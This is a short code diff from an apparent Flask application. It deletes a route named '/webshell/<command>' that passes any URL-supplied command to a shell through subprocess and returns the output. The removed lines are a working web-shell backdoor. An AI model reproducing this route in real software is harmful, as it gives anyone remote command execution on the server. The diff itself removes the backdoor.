@@ -61,8 +61,3 @@ def uploads(file_name):
             return file_content
         except UnicodeDecodeError:
             return 'Cannot display binary file.'
-
-@app.route('/webshell/<command>')
-def webshell(command):
-    result = subprocess.check_output(command, shell=True)
-    return result.decode('utf-8')
